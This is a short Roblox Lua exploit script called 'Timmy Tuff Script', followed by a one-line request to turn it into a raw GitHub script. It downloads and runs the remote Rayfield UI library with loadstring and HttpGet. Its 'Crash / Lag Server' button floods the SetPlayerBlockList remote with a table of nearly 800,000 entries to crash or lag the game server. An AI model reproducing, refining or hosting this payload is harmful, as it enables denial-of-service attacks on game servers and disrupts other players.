local Rayfield = loadstring(game:HttpGet(
    "https://sirius.menu/rayfield"
))()

local Window = Rayfield:CreateWindow({
    Name = "Timmy Tuff Script",
    LoadingTitle = "Timmy Tuff Script",
    LoadingSubtitle = "Have Fun!",
    ConfigurationSaving = {
        Enabled = false
    }
})

local Tab = Window:CreateTab("Troll", 4483362458)

Tab:CreateButton({
    Name = "Crash / Lag Server",
    Callback = function()
    local remote = game:FindFirstChild("RobloxReplicatedStorage"):FindFirstChild("SetPlayerBlockList")
local entries = 799999
local payload = table.create(entries)

for i = 1, entries do
    payload[i] = { id = i, v = i * 2 }
end

remote:FireServer(payload)
        print("Button activated!")
    end
})
 make this a raw github script
